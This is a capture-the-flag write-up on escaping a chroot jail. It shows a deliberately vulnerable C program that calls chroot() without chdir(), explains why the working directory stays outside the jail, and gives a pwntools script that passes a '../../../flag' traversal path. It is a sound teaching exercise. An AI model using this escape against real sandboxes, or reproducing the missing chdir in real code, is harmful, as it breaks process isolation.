#metadata(
  (
    title: "Chroot without chdir",
    description: "A common mistake when implementing jails is forgetting to change the working directory after calling chroot(). Exploit this oversight to escape the jail and read the flag.",
    date: "2026-01-04",
    order: 1,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Chroot without chdir

== Challenge Source Code

```c
//c.c
#include <assert.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    assert(argc > 1);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "try harder", 10);
    close(fffd);

    sendfile(1, open(argv[1], 0), 0, 128);

}
```

== Vulnerability Analysis

The vulnerability is a missing `chdir("/")` after `chroot()`.

```c
assert(chroot(jail_path) == 0);
// Missing: chdir("/");
```

The `chroot` system call changes the root directory (`/`) for the process, but it does *not* automatically change the Current Working Directory (CWD). If the process was in `/home/user` before the chroot, it remains in `/home/user` afterwards—even if `/home/user` is outside the new jail root.

Because the CWD is outside the jail, relative paths like `../` are resolved relative to the *host's* filesystem, allowing us to traverse up to the real root.

== Exploitation Plan

1. *Traverse Up:* Since our CWD is effectively "outside" the new root, we can use `../../` to reach the real root directory.
2. *Access Flag:* Provide the path `../../../flag` (or enough `../`s) as the argument to the program. The program will resolve this relative to the CWD, reaching the real flag.

== Exploit Script

```python
from pwn import *

exe = "./challenge"
context.binary = exe

# We pass a relative path containing multiple '../' to traverse out of the jail
# and reach the real flag file.
payload = "../../../flag"

p = process([exe, payload])
print(p.recvall().decode())
```
